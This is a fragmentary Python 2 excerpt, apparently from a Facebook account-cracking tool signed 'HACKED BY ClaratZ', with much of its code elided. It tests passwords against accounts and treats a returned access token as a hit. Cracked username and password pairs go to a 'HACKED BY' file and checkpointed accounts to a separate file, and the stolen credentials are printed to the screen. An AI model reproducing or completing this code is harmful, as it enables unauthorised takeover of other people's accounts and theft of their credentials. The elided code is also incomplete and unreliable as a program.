    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                okb = open('save/ HACKED BY ClaratZ  .txt', 'a')
                okb.write(k + c + user + '   ' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;92mHACKED BY ClaratZ\x1b[1;92m ' + k + c + user + '  yes  ' + pass1 + '\n'
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;92mHACKED BY ClaratZ \x1b[1;92m ' + k + c + user + '  yes  ' + pass2 + '\n'
                cps = open('save/checkpoint.txt', 'a')
